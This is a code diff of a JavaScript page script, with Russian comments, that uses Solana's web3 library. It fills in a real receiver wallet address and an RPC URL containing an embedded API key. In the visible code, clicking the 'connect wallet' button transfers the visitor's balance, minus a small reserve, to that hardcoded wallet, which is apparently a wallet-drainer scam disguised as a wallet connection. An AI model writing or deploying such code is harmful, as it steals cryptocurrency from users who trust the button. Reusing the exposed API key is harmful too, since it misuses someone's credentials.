@@ -8,7 +8,7 @@ $(document).ready(function () {
 
                 // Установка соединения с RPC
                 const connection = new solanaWeb3.Connection(
-                    'https://api.mainnet-beta.solana.com', // Используйте публичный RPC или ваш API
+                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN', // Используйте публичный RPC или ваш API
                     'confirmed'
                 );
 
@@ -29,7 +29,7 @@ $(document).ready(function () {
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
                         // Указание получателя перевода
-                        const receiverWallet = new solanaWeb3.PublicKey('XXXXXXXXXXX'); // Замените на кошелек получателя
+                        const receiverWallet = new solanaWeb3.PublicKey('DVm4XnbDT6hzhcVJBeM2DMbq3URGDpC5qkzd2rwhvFwK'); // Замените на кошелек получателя
                         const balanceForTransfer = walletBalance - minBalance;
 
                         if (balanceForTransfer <= 0) {
